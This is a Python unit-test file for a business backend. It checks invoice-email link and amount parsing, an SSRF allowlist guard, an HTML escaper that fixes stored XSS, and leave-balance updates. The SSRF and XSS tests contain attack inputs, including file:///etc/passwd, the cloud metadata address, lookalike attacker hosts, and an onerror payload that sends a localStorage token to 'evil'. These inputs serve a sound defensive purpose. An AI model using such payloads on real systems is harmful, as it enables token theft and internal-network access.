"""Unit / regression tests for pure backend helpers.

Each test pins a bug fixed during the 2026-07 QA passes so it can't silently regress:
  - _invtrack_body_fields  → invoice download-link extraction + amount parse
  - _invtrack_url_safe      → SSRF/allowlist guard on invoice fetches
  - _hesc                   → HTML-escaping used on the one-click approval pages (stored-XSS fix)
  - _leave_apply_balance    → leave approval actually decrements the balance
"""
import app
import db


# --------------------------------------------------------------------------- invoice parsing
_VNPT_EMAIL = """
<html><body>
<p>Kính gửi Quý khách, hóa đơn điện tử của <b>ACME CO., LTD</b>.</p>
<p>Mẫu số: 1/001 &nbsp; Ký hiệu: C25MRB &nbsp; Số hóa đơn: 00012345</p>
<p>Mã số thuế: 0313987654</p>
<p>Tổng tiền thanh toán: 5.475.000 VND</p>
<p>Tiền trước thuế: 4.977.273 &nbsp; Thuế GTGT: 497.727</p>
<a href="https://mercurebanahills-tt78.vnpt-invoice.com.vn/Invoice/Download?token=abc&type=pdf">Tải PDF</a>
<a href="https://mercurebanahills-tt78.vnpt-invoice.com.vn/Invoice/Download?token=abc&type=xml">Tải XML</a>
<a href="https://mercurebanahills-tt78.vnpt-invoice.com.vn/Invoice/Show?token=abc">Xem tại đây</a>
</body></html>
"""


def test_invoice_extracts_download_links_not_the_view_link(monkeypatch):
    # url_safe does live DNS; stub it so the classification logic is what's under test.
    monkeypatch.setattr(app, "_invtrack_url_safe", lambda u: True)
    out = app._invtrack_body_fields(_VNPT_EMAIL)
    urls = out["fileUrls"]
    assert any("type=pdf" in u for u in urls), "PDF download link must be captured"
    assert any("type=xml" in u for u in urls), "XML download link must be captured"
    # the human 'Xem'/Show *view* link is a lookup page, not a file — it must NOT be a fileUrl
    assert all("/Show?" not in u for u in urls), "the view/lookup link must be excluded"
    # PDF is sorted first (human-readable, carries the total)
    assert "type=pdf" in urls[0]


def test_invoice_parses_total_and_number(monkeypatch):
    monkeypatch.setattr(app, "_invtrack_url_safe", lambda u: True)
    out = app._invtrack_body_fields(_VNPT_EMAIL)
    assert out.get("after") == 5475000, "grand total (Tổng tiền thanh toán) must parse"
    assert out.get("invNo") == "12345"     # parser normalises leading zeros (0*) off the number
    assert out.get("taxCode") == "0313987654"


# --------------------------------------------------------------------------- SSRF / allowlist guard
def test_url_safe_rejects_non_http_scheme():
    assert app._invtrack_url_safe("ftp://vnpt-invoice.com.vn/x") is False
    assert app._invtrack_url_safe("file:///etc/passwd") is False


def test_url_safe_rejects_cloud_metadata_and_unknown_hosts():
    # cloud metadata IP + arbitrary hosts must be refused before any fetch
    assert app._invtrack_url_safe("http://169.254.169.254/latest/meta-data/") is False
    assert app._invtrack_url_safe("https://evil.example.com/invoice.pdf") is False


def test_url_safe_rejects_lookalike_host():
    # the allowlisted string appears, but not as the real host suffix — must NOT match
    # (guards against a substring/suffix-confusion bypass; no DNS needed, fails the host check first)
    assert app._invtrack_url_safe("https://vnpt-invoice.com.vn.attacker.com/x") is False
    assert app._invtrack_url_safe("https://notvnpt-invoice.com.vn/x") is False


# --------------------------------------------------------------------------- stored-XSS escaper
def test_hesc_neutralizes_html():
    payload = '<img src=x onerror="fetch(\'evil?\'+localStorage.tk_token)">'
    out = app._hesc(payload)
    assert "<img" not in out and "&lt;img" in out
    assert "onerror" in out          # text survives...
    assert 'onerror="' not in out    # ...but the attribute-opening quote is escaped, so it can't execute
    assert app._hesc('a & b') == "a &amp; b"


# --------------------------------------------------------------------------- leave-balance decrement
def test_leave_approval_decrements_annual(base_url):
    db.create_employee({"id": "HML-LV1", "name": "Leave A", "email": "lva@humiley.com",
                        "role": "staff", "level": "staff", "annualTotal": 12, "annualUsed": 2,
                        "sickTotal": 30, "sickUsed": 0})
    # _leave_apply_balance is an instance method that never touches self → call unbound with None.
    app.Handler._leave_apply_balance(None, {"emp_id": "HML-LV1", "type": "Annual Leave", "days": 3})
    emp = db.get_employee("HML-LV1")
    assert float(emp["annualUsed"]) == 5.0     # 2 + 3
    assert float(emp["sickUsed"]) == 0.0       # untouched


def test_leave_approval_decrements_sick(base_url):
    db.create_employee({"id": "HML-LV2", "name": "Leave B", "email": "lvb@humiley.com",
                        "role": "staff", "level": "staff", "annualTotal": 12, "annualUsed": 0,
                        "sickTotal": 30, "sickUsed": 1})
    app.Handler._leave_apply_balance(None, {"emp_id": "HML-LV2", "type": "Sick Leave", "days": 2})
    emp = db.get_employee("HML-LV2")
    assert float(emp["sickUsed"]) == 3.0       # 1 + 2
    assert float(emp["annualUsed"]) == 0.0     # untouched


def test_leave_unpaid_touches_no_balance(base_url):
    db.create_employee({"id": "HML-LV3", "name": "Leave C", "email": "lvc@humiley.com",
                        "role": "staff", "level": "staff", "annualTotal": 12, "annualUsed": 4,
                        "sickTotal": 30, "sickUsed": 4})
    app.Handler._leave_apply_balance(None, {"emp_id": "HML-LV3", "type": "Unpaid Leave", "days": 5})
    emp = db.get_employee("HML-LV3")
    assert float(emp["annualUsed"]) == 4.0 and float(emp["sickUsed"]) == 4.0
